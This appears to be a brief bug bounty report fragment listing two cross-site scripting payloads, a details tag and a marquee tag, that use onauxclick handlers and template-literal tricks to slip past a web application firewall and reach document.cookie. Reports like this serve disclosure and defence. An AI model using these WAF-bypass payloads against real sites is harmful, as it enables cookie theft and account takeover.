## Program Summary

> The following payloads were used to bypass the WAF and perform XSS:

Basic payload but did not work on all browsers:

```html
"><details onauxclick=x=prompt,x`${document.cookie}`></details>
```

Payload worked on all browsers, but needed a right-click to be executed:

```html
"><marquee+width=1000+onauxclick=confirm(document.cookie)>XSS</marquee>
```
